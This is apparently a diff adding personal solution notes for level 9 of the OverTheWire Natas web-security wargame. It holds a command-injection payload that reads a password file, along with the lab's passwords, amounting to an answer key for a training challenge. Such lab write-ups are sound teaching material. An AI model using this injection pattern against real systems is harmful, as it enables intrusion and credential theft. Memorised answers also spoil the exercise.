@@ -1,0 +1,30 @@
+
+*** Natas Level 9 ***
+
+GOAL:
+-----
+1)  Username: natas9
+    URL:      http://natas9.natas.labs.overthewire.org
+
+
+HINTS:
+------
+No input sanitation
+
+HELP:
+-----
+command execution vulnerability
+
+SOLUTIONS:
+----------
+1)  $ curl -vu natas9 http://natas9.natas.labs.overthewire.org/
+2)  $ W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+3)  $ curl -vu natas9 http://natas9.natas.labs.overthewire.org/
+                             index-source.html | html2text
+4)  $ W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+5)  $ x-www-browser http://natas9.natas.labs.overthewire.org/
+6)  $ ; cat /etc/natas_webpass/natas10 #
+
+
+Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
